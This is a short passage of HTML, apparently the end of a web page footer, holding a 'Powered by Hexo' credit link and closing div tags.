       Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
     </div>
   </div>
